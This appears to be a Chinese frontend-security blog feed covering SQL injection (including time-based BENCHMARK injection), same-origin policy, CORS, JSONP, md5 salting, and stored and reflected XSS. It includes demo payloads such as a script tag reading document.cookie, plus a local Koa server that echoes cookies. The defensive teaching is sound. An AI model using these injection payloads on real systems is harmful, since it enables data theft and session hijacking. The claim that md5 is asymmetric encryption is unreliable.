class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count, expr)</span><br></pre></td></tr></table></figure><p>函数实现的是将 expr 表达式执行 count 次。借此，我们利用该函数构造如下表达式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>; <span class="keyword">select</span> BENCHMARK(<span class="number">100000</span>, ENCODE(<span class="string">&#x27;timing&#x27;</span>, <span class="string">&#x27;attack&#x27;</span>))</span><br></pre></td></tr></table></figure><p>即需要在输入框中输入<code>1; select BENCHMARK(100000, ENCODE(&#39;timing&#39;, &#39;attack&#39;))</code>并执行:<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913478686-0deade75-0d17-4f80-9e6c-3d4d9aab485b.png#height=54&id=nqgeX&originHeight=54&originWidth=353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3860&status=done&style=none&title=&width=353" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913478686-0deade75-0d17-4f80-9e6c-3d4d9aab485b.png#height=54&id=nqgeX&originHeight=54&originWidth=353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3860&status=done&style=none&title=&width=353" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="10.png"></p><p>执行结果：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913487558-53b5f3a6-7324-4488-b1e4-f8ad4b223a28.png#height=424&id=JUbdD&originHeight=424&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21211&status=done&style=none&title=&width=554" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913487558-53b5f3a6-7324-4488-b1e4-f8ad4b223a28.png#height=424&id=JUbdD&originHeight=424&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21211&status=done&style=none&title=&width=554" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="11.png"></p><p>可见，请求在 16.43ms 后执行完成。接着修改 BENCHMARK()的执行次数为 10000000 次:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>; <span class="keyword">select</span> BENCHMARK(<span class="number">10000000</span>, ENCODE(<span class="string">&#x27;timing&#x27;</span>, <span class="string">&#x27;attack&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913496375-c38e9efb-6c50-4d4a-95cb-71d1950200f1.png#height=431&id=aEaxU&originHeight=431&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21952&status=done&style=none&title=&width=550" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913496375-c38e9efb-6c50-4d4a-95cb-71d1950200f1.png#height=431&id=aEaxU&originHeight=431&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21952&status=done&style=none&title=&width=550" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="12.png"></p><p>同样搜索目标为<code>id=1</code>的信息，请求返回的时间却相差巨大，由此也可以判断出该接口存在 SQL 注入漏洞。</p><p><a name="68027d5b"></a></p><h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><p>理论上来说，只要存在 SQL 注入漏洞，就有可能被成功攻击，反过来说就是，只要消灭 SQL 注入漏洞，被成功攻击的可能性就更低。所以我们 SQL 注入防御工程需要做一下两件事:</p><ol><li>找到所有的 SQL 注入漏洞;</li><li>修补这些漏洞。</li></ol><p>做好以上两件事，就能有效防御 SQL 注入攻击。做好防御工程并不是一件容易的事情，下面介绍有哪些常用的防御手段。</p><p><a name="42ed45ab"></a></p><h4 id="使用预编译语句"><a href="#使用预编译语句" class="headerlink" title="使用预编译语句"></a>使用预编译语句</h4><p>预编译语句的工作原理：</p><ol><li>预处理：创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记 。例如：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> myCity (Name, CountryCode, District) <span class="keyword">VALUES</span> (?, ?, ?)</span><br></pre></td></tr></table></figure><ol start="2"><li>数据库解析，编译，对 SQL 语句模板执行查询优化，并存储结果不输出。</li><li>执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。<br />例如在 PHP 中这样使用：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT INTO myCity (Name, CountryCode, District) VALUES (?, ?, ?)&quot;</span>; <span class="comment">// 定义预编译语句, 预留？？？分别对应Name, CountryCode, District变量</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>); <span class="comment">// mysql解析</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$val1</span>, <span class="variable">$val2</span>, <span class="variable">$val3</span>);</span><br><span class="line"><span class="variable">$val1</span> = <span class="string">&#x27;Stuttgart&#x27;</span>; <span class="comment">// 赋值</span></span><br><span class="line"><span class="variable">$val2</span> = <span class="string">&#x27;DEU&#x27;</span>;</span><br><span class="line"><span class="variable">$val3</span> = <span class="string">&#x27;Baden-Wuerttemberg&#x27;</span>;</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(); <span class="comment">// 执行语句</span></span><br></pre></td></tr></table></figure><p><br />使用预编译的 SQL 语句，SQL 语句的语义不会发生改变。在 SQL 语句中，变量用？表示，攻击者无法改变 SQL 的结构。</p><p><a name="ed5cd509"></a></p><h4 id="使用存储过程"><a href="#使用存储过程" class="headerlink" title="使用存储过程"></a>使用存储过程</h4><p>使用存储过程的效果和使用预编语句译类似，其区别就是存储过程需要先将 SQL 语句定义在数据库中。但需要注意的是，存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的 SQL 语句。如果无法避免，则应该使用严格的输入过滤或者是编码函数来处理用户的输入数据。</p><p><a name="0937fe74"></a></p><h4 id="检查数据类型"><a href="#检查数据类型" class="headerlink" title="检查数据类型"></a>检查数据类型</h4><p>检查用户输入，严格控制数据格式在某种程度上来说，也可以有限防御 SQL 攻击。</p><p>例如在文章最开始的攻击举例中，id 字段应该是一个 integer 类型的数据，所以只需在接收参数的处理函数稍加处理:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/getStudentById&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">id</span> !== <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(&#123;</span><br><span class="line">      <span class="attr">status</span>: <span class="title class_">Status</span>.<span class="property">Error</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&quot;请输入正确的数据格式！&quot;</span>,</span><br><span class="line">      <span class="attr">data</span>: <span class="literal">null</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> sql = <span class="string">`select * from student where id = <span class="subst">$&#123;req.query.id&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取所有的数据</span></span><br><span class="line">  connection.<span class="title function_">query</span>(sql, <span class="keyword">function</span> (<span class="params">err, rows, fields</span>) &#123;</span><br><span class="line">    <span class="comment">/*... code ...*/</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>经过格式检查的处理后，该接口的 SQL 漏洞直接消失殆尽，因为单纯的 integer 数据无法构造出 SQL 语句。不过总有需要用户输入字符串作为数据的时候，这时限制数据类型为字符串并不能有效消灭 SQL 漏洞，这时就需要使用安全编码函数。</p><p><a name="73821367"></a></p><h4 id="使用安全函数"><a href="#使用安全函数" class="headerlink" title="使用安全函数"></a>使用安全函数</h4><p>使用安全编码函数对用户输入数据按照黑名单原则进行敏感字符进行转义编码，也能有效地减少 SQL 注入攻击，一般数据库厂商都会给出黑名单指导意见。例如在 Mysql 中，厂商建议按照一下思路进行编码字符:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NUL (0x00) --&gt; \0 BS (0x08) --&gt; \b TAB (0x09) --&gt; \t LF (0x0a) --&gt; \n CR (0x0d)</span><br><span class="line">--&gt; \r SUB (0x1a) --&gt; \z &quot; (0x22) --&gt; \&quot; % (0x25) --&gt; \% &#x27; (0x27) --&gt; \&#x27; \</span><br><span class="line">(0x5c) --&gt; \\ _ (0x5f) --&gt; \_</span><br></pre></td></tr></table></figure><p><a name="45adcc85"></a></p><h4 id="最小权限原则"><a href="#最小权限原则" class="headerlink" title="最小权限原则"></a>最小权限原则</h4><p>在最后，从数据库自身的角度来说，应该使用最小权限原则，避免 Web 应用直接使用 root、dbowner 等高权限账户直接连接数据库。如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户。Web 应用使用的数据库账户，不应该有创建自定义函数、操作本地文件的权限。</p><p><a name="25f9c7fa"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>安全问题就是信任问题，注入攻击是过于信任用户输入的结果，也违背了“数据与代码分离原则”。它有两个条件：一是用户能够控制数据的输入；二是代码拼凑了用户输入的数据，把数据当做代码执行了。在编写代码时，保持“一切不可信任”的思想，在用户交互需要输入数据的地方加强安全检查，尤其是当用户数据需要拼接代码时，如此以往就能有效减少注入漏洞。</p><p><a href="https://redtiger.labs.overthewire.org/">练习</a> — <a href="https://blog.spoock.com/2016/07/25/redtiger-writeup/">解答</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同源策略</title>
      <link href="/2023/06/29/frontend/security/tong-yuan-ce-lue/"/>
      <url>/2023/06/29/frontend/security/tong-yuan-ce-lue/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="jV1xx"></a></p><h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p><a name="JE7tZ"></a></p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>不同源的页面之间，不准互相访问数据。这是浏览器故意设置的一个功能限制。<br><a name="PdLFH"></a></p><h2 id="源"><a href="#源" class="headerlink" title="源"></a>源</h2><p>window.origin 或 location.origin 可以得到当前源<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25399795/1644118141453-db6e8915-977d-4841-b4dd-41ba8f6963c8.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25399795/1644118141453-db6e8915-977d-4841-b4dd-41ba8f6963c8.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="uvrrW"></a></p><h2 id="浏览器规定"><a href="#浏览器规定" class="headerlink" title="浏览器规定"></a>浏览器规定</h2><p>如果 JS 运行在源 A 中，那么就只能获取源 A 的数据<br />不能获取源 B 的数据，即不允许跨域</p><p><a name="we3dK"></a></p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><p>突破浏览器限制的方法<br /><strong>response.setHeader(‘Access-Control-Allow-Origin’, ‘<a href="http://localhost:9990/">http://localhost:9990</a>‘)</strong></p><p><a name="dyur8"></a></p><h1 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h1><p>什么是 JSONP?<br />由于某些浏览器（IE 6,7,8,9）不支持 CORS，所以采用<br />请求一个 JS 文件，JS 会执行一个回调，回调里面包含我们的数据<br />回调名字是随机生成的，用 callback 的参数传给后台，后台会再次返回并执行<br />JSON 的优点<br />可以跨域，兼容 IE<br />JSON 的缺点<br />由于 JSON 用的是 script 标签，所以它传入的数据不精确（拿不到状态码），也只能支持 get 请求，不支持 post</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5 加密存储</title>
      <link href="/2023/06/29/frontend/security/md5-jia-mi-cun-chu/"/>
      <url>/2023/06/29/frontend/security/md5-jia-mi-cun-chu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="84zeA"></a></p><h3 id="使用-md5-加密存储不安全怎么解决"><a href="#使用-md5-加密存储不安全怎么解决" class="headerlink" title="使用 md5 加密存储不安全怎么解决"></a>使用 md5 加密存储不安全怎么解决</h3><p>md5 是一种常见的非对称加密算法，一般通过加密后的 md5 值获取到原始的字符串并不容易。但是通过彩虹表（将常见密码及其 md5 值对应表预先计算好），可以快速查询到表中的 md5 对应的原文。解决办法是将密码拼接一个字符串（也叫 salt）之后再用 md5 加密。也可以使用其它加密方式。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS攻击</title>
      <link href="/2023/06/29/frontend/security/xss-gong-ji/"/>
      <url>/2023/06/29/frontend/security/xss-gong-ji/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>一、XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS 重叠，所以只能叫 XSS。</p><p><a name="e23PT"></a></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>不需要你做任何的登录认证，它会通过合法的操作（如在 url 输入，在评论框中输入），向你的页面注入脚本（可能是 js， html 代码块等），当用户浏览该页时，嵌入 web 的脚本代码被执行，从而完成攻击。</p><p><a name="bTm82"></a></p><h1 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h1><p>一、跨站脚本攻击有可能造成以下影响:</p><ol><li>利用虚假输入表单骗取用户个人信息。</li><li>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li><li>显示伪造的文章或图片。</li></ol><p><a name="VCbe1"></a></p><h1 id="XSS-攻击手段-x2F-类型"><a href="#XSS-攻击手段-x2F-类型" class="headerlink" title="XSS 攻击手段&#x2F;类型"></a>XSS 攻击手段&#x2F;类型<br /><br /></h1><p><a name="SDETv"></a></p><h2 id="持久型-XSS-x2F-存储型-XSS"><a href="#持久型-XSS-x2F-存储型-XSS" class="headerlink" title="持久型 XSS &#x2F; 存储型 XSS"></a>持久型 XSS &#x2F; 存储型 XSS</h2><p>一、表单提交的数据存在恶意代码，被保存到目标网站的服务器中，当前端页面获得后端从数据库中读取的注入代码时，恰好将其渲染执行。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/355497/1646902031365-de7abdd2-c581-43e6-a1b0-57beeeedd804.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_17,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=oAoim&originHeight=192&originWidth=599&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/355497/1646902031365-de7abdd2-c581-43e6-a1b0-57beeeedd804.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_17,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=oAoim&originHeight=192&originWidth=599&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><table><thead><tr><th>【示例】举个例子，对于评论功能来说，就得防范持久型 XSS 攻击，因为我可以在评论中输入以下内容</th></tr></thead></table><p><img src="https://cdn.nlark.com/yuque/0/2022/png/355497/1657002654728-fdd8642f-409b-42ef-9d15-9433b09b4fb0.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_22,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=ZGlca&originHeight=278&originWidth=769&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/355497/1657002654728-fdd8642f-409b-42ef-9d15-9433b09b4fb0.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_22,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=ZGlca&originHeight=278&originWidth=769&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>二、主要注入页面方式和非持久型 XSS 漏洞类似，只不过持久型的不是来源于 URL，referer，forms 等，而是来源于后端从数据库中读出来的数据 。持久型 XSS 攻击不需要诱骗点击，黑客只需要在提交表单的地方完成注入即可，但是这种 XSS 攻击的成本相对还是很高。<br><a name="wlKrS"></a></p><h3 id="存储型-XSS-的条件"><a href="#存储型-XSS-的条件" class="headerlink" title="存储型 XSS 的条件"></a><br />存储型 XSS 的条件</h3><p>攻击成功需要同时满足以下<strong>几个条件</strong>：<br />●POST 请求提交表单后端没做转义直接入库。<br />● 后端从数据库中取出数据没做转义直接输出给前端。<br />● 前端拿到后端数据没做转义直接渲染成 DOM。<br><a name="OcFm2"></a></p><h3 id="存储型-XSS-的特点"><a href="#存储型-XSS-的特点" class="headerlink" title="存储型 XSS 的特点"></a><br />存储型 XSS 的特点</h3><p>持久型 XSS 有以下<strong>几个特点</strong>：<br />● 持久性，植入在数据库(DB)中<br />● 盗取用户敏感私密信息<br />● 危害面广<br><a name="m78g8"></a></p><h3 id="存储型-XSS-的攻击步骤"><a href="#存储型-XSS-的攻击步骤" class="headerlink" title="存储型 XSS 的攻击步骤"></a><br />存储型 XSS 的攻击步骤</h3><p>存储型 XSS 的攻击步骤如下：<br /> 1. 攻击者将恶意代码提交到目标网站数据库中。<br /> 2. 用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到 html 中返回给浏览器中。 <br /> 3. 用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。<br /> 4. 那么恶意代码执行后，就能获取到用户数据，比如上面的 cookie 等信息，那么把该 cookie 发送到攻击者网站中，那么攻击者拿到该 cookie 然后会冒充该用户的行为，调用目标网站接口等违法操作。<br><a name="s3v2h"></a></p><h3 id="存储型-XSS-的防范"><a href="#存储型-XSS-的防范" class="headerlink" title="存储型 XSS 的防范"></a><br />存储型 XSS 的防范</h3><p>如何防范 ：<br /> 1. 后端需要对提交的数据进行过滤。 <br /> 2. 前端也可以做一下处理方式，比如对 script 标签，将特殊字符替换成 HTML 编码这些等。<br /> 3. 前端避免直接渲染，先转为文本</p><p><a name="p985j"></a></p><h2 id="非持久型-XSS"><a href="#非持久型-XSS" class="headerlink" title="非持久型 XSS"></a>非持久型 XSS<br /><br /></h2><p><a name="Utwut"></a></p><h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>一、发出请求时，xss 代码出现在 url 中，作为输入提交到服务器端，服务器端解析后响应，xss 代码随响应内容一起传回给浏览器，然后浏览器解析执行 xss 代码。</p><p>1、为什么叫反射型 XSS？<br />因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的。</p><p>2、为什么叫非持久性 XSS？<br />因为这种攻击方式只有一次性。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/355497/1625561048339-91047d00-09ac-4f3d-8944-a4daaf0b43f1.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_21,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=xAnga&originHeight=149&originWidth=732&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/355497/1625561048339-91047d00-09ac-4f3d-8944-a4daaf0b43f1.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_21,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#from=url&id=xAnga&originHeight=149&originWidth=732&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>| 【示例】页面中含如下代码，攻击者可以直接通过 URL (类似：<a href="https://xxx.com/xxx?default=">https://xxx.com/xxx?default=</a><script>alert(document.cookie)</script>) 注入可执行的脚本代码。不过一些浏览器如 Chrome 其内置了一些 XSS 过滤器，可以防止大部分反射型 XSS 攻击。&#96;&#96;&#96;javascript<br><select></p>  <script>      document.write(''                     + '<option value=1>'                     +     location.href.substring(location.href.indexOf('default=') + 8)                     + '</option>'                    );      document.write('<option value=2>English</option>');  </script></select><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> |</span><br><span class="line">| --- |</span><br><span class="line"></span><br><span class="line">| 【示例】常见的反射型 XSS 是：恶意链接。比如我现在做一个 demo。在本地启动一个简单的服务器，然后在页面上点击一个链接后，比如如下代码：html 代码如下：</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=utf-8&gt;</span><br><span class="line">  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">  &lt;title&gt;csrf攻击&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;a href=&quot;http://localhost:3001/xss&quot;&gt;xxs 攻击&lt;/a&gt;</span><br><span class="line">    &lt;a href=&quot;http://localhost:3001/testcookie&quot;&gt;testcookie 攻击&lt;/a&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><br /><br />【示例】常见的反射型 XSS 是：恶意链接。比如我现在做一个 demo。在本地启动一个简单的服务器，然后在页面上点击一个链接后，比如如下代码：html 代码如下：<br />然后 node 中 app.js 代码如下：&#96;&#96;&#96;javascript</p><p>const Koa &#x3D; require(‘koa’);<br>const fs &#x3D; require(‘fs’);<br>const path &#x3D; require(‘path’);<br>const router &#x3D; require(‘koa-router’)();<br>const koaBody &#x3D; require(‘koa-body’);<br>const static &#x3D; require(‘koa-static’);</p><p>const app &#x3D; new Koa();</p><p>router.get(‘&#x2F;‘, (ctx, next) &#x3D;&gt; {<br>&#x2F;&#x2F; 设置头类型, 如果不设置，会直接下载该页面<br>ctx.type &#x3D; ‘html’;<br>&#x2F;&#x2F; 读取文件<br>const pathUrl &#x3D; path.join(__dirname, ‘&#x2F;static&#x2F;index.html’);<br>ctx.body &#x3D; fs.createReadStream(pathUrl);<br>next();<br>});</p><p>router.get(‘&#x2F;xss’, (ctx, next) &#x3D;&gt; {<br>ctx.body &#x3D; ‘<script>alert("反射型 XSS 攻击")</script>‘;<br>});<br>router.get(‘&#x2F;testcookie’, (ctx, next) &#x3D;&gt; {<br>console.log(ctx.cookies.get(‘connect.sid’));<br>ctx.body &#x3D; ‘<script>alert("'+ctx.cookies.get('connect.sid')+'")</script>‘;<br>next();<br>});</p><p>app.use(static(path.join(__dirname)));</p><p>app.use(router.routes());<br>app.use(router.allowedMethods());</p><p>app.listen(3001, () &#x3D;&gt; {<br>console.log(‘server is listen in 3001’);<br>});</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">如上代码，当用户点击xxs 攻击恶意链接时候，页面会跳转到 http://localhost:3001/xss 攻击者预先准备的页面，然后会返回攻击者准备的js脚本，该js脚本就在浏览器中执行了，如下所示：&lt;br /&gt;&lt;br /&gt;![](https://cdn.nlark.com/yuque/0/2022/png/355497/1647220225733-e142aa42-1f9f-4405-8d7d-7d45180f4841.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_70%2Ctext_QGFTdW5jYXQ%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fresize%2Cw_824%2Climit_0#from=url&amp;id=Ixbym&amp;originHeight=245&amp;originWidth=824&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=)</span><br><span class="line"></span><br><span class="line">然后我们点击 testcookie 该链接，也会调用node中的 router.get(&#x27;/testcookie&#x27;, (ctx, next) =&gt; &#123;&#125;) 这个请求获取到cookie，如下所示：</span><br><span class="line"></span><br><span class="line">![](https://cdn.nlark.com/yuque/0/2022/png/355497/1647220238518-b756be01-097c-4567-8a42-154d52be52c8.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_60%2Ctext_QGFTdW5jYXQ%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10#from=url&amp;id=I1SKp&amp;originHeight=504&amp;originWidth=2100&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=)</span><br><span class="line"></span><br><span class="line">如上我们就可以很容易通过xss攻击拿到对方的cookie信息了。 |</span><br><span class="line">| --- |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**反射型XSS特征**&lt;br /&gt;一、非持久型 XSS 漏洞攻击有以下几点**特征**：&lt;br /&gt;●即时性，不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据。&lt;br /&gt;●攻击者需要诱骗点击,必须要通过用户点击链接才能发起&lt;br /&gt;●反馈率低，所以较难发现和响应修复&lt;br /&gt;●盗取用户敏感保密信息</span><br><span class="line"></span><br><span class="line">**反射型XSS攻击步骤**&lt;br /&gt;一、反射型XSS攻击步骤：&lt;br /&gt;1. 攻击者在url后面的参数中加入恶意攻击代码。 2. 当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。 3. 用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。 4. 攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户的行为，调用目标网站接口执行攻击等操作。</span><br><span class="line"></span><br><span class="line">**反射型XSS的防范：**&lt;br /&gt;一、为了防止出现非持久型 XSS 漏洞，需要确保这么几件事情：&lt;br /&gt;●Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端。&lt;br /&gt;●尽量不要从URL，document.referrer，document.forms等这种 DOM API 